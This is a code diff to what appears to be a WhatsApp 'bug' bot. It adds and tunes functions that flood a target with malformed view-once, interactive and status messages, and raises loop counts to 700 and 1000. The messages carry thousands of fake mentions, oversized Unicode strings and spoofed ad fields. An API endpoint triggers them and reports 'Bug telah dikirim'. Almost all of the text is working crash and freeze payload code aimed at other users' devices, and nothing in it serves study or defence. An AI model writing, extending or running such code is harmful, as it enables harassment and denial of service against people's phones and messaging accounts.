@@ -89,6 +89,9 @@ const { imageMessage } = await generateWAMessageContent({ image: { url },}, {
   })
   return imageMessage
 }
+async function delay(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+  }
 
   sock.ev.on("connection.update", async (update) => {
     const { connection, lastDisconnect } = update;
@@ -325,7 +328,7 @@ function pseudoRandomBytes(length) {
 // ################## //
 // === FUNCTION BUG === //
 async function OfferMpM(target) {
-for (let iter = 1; iter <= 200; iter++) {
+for (let iter = 1; iter <= 700; iter++) {
   const msg = await generateWAMessageFromContent(
     target,
       {
@@ -418,42 +421,53 @@ for (let iter = 1; iter <= 900; iter++) {
  }
 }
 
-async function FreezeFileInvis(target, Ptcp = true) {
-    let anjays = "x" + "ြ".repeat(25000) + "@1".repeat(60000);
-    await sock.relayMessage(target, {
-            message: {
-                ViewOnceMessage: {
-                    message: {
-                        documentMessage: {
-                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
-                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
-                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
-                            fileLength: "999999999",
-                            pageCount: 0x9184e729fff,
-                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
-                            fileName: "NtahMengapa..",
-                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
-                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
-                            mediaKeyTimestamp: "1715880173",
-                            contactVcard: true
-                        },
-                        title: "hytam vs putyh",
-                        hasMediaAttachment: true
-                    },
-                    body: {
-                        text: anjays
-                    },
-                    nativeFlowMessage: {},
-                    contextInfo: {
-               mentionedJid: Array.from({ length: 5 }, () => "status@broadcast")
-            }
-          }
-        }
-    }, { participant: { jid: target } }, { messageId: null });
+async function FreezeMultiJid(target, jiAiDi) {
+for(let I = 0; I < 1000; I++) {
+  await sock.relayMessage(target, {
+      viewOnceMessage: {
+        message: {
+          interactiveResponseMessage: {
+            body: {
+              text: "sock",
+              format: "DEFAULT"
+            },
+            nativeFlowResponseMessage: {
+              name: "call_permission_request",
+              paramsJson: "-",
+              version: 3
+            },
+            contextInfo: {
+              mentionedJid: Array.from({ length:2000 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`),
+              externalAdReply: {
+                body: "wxx",
+                mediaType: 1,
+                thumbnailUrl: "https://files.catbox.moe/aauj7v.webp",
+                sourceUrl: "https://t.me/whyuxD",
+                sourceType: "whatsapp",
+                cdogio: 'cdogio' + Math.floor(Math.random() * 1000000),
+                sourceId: String(Math.floor(Math.random() * 900000000) + 100000),
+                ctwaClid: 'clid' + Math.floor(Math.random() * 1000000),
+                ctaPayload: 'payload' + Math.random().toString(36).substring(2, 10),
+                ref: "referencia",
+                mediaType: 1,
+                clickToWhatsappCall: true,
+                adContextPreviewDismissed: false,
+                sourceApp: "com.whatsapp",
+                automatedGreetingMessageShown: true,
+                greetingMessageBody: "x",
+                disableNudge: true,
+                originalImageUrl: "https://t.me/whyuxD"
+              }
+            },
+          }
+        }
+      }
+    }, jiAiDi ? { participant: { jid:target } } : {});
+  }
 }
 
 async function InvisDelayPriv(target, jiAiDi) {
-for(let I = 0; I < 70; I++) {
+for(let I = 0; I < 1000; I++) {
   await sock.relayMessage("status@broadcast", {
       ephemeralMessage: {
         message: {
@@ -496,9 +510,9 @@ for(let I = 0; I < 70; I++) {
     }, jiAiDi ? { statusJidList:[target] } : {});
   }
 }
+// ###################### //
+// ###################### //
 
-// ###################### //
-// ###################### //
   try {
     let message = "";
     if (type === "bug_a") {
@@ -508,10 +522,12 @@ for(let I = 0; I < 70; I++) {
       await NativeSql3(jid)
       return res.json({ success: true, message: "Bug telah dikirim" });
     } else if (type === "bug_c") {
-      await FreezeFileInvis(jid)
+      await FreezeMultiJid(jid, true)
+      await delay(3000)
+      await InvisDelayPriv(jid, true)
       return res.json({ success: true, message: "Bug telah dikirim" });
     } else if (type === "bug_d") {
-      await InvisDelayPriv(jid, true)
+
       return res.json({ success: true, message: "Bug telah dikirim" });
     } else if (type === "bug_e") {
 
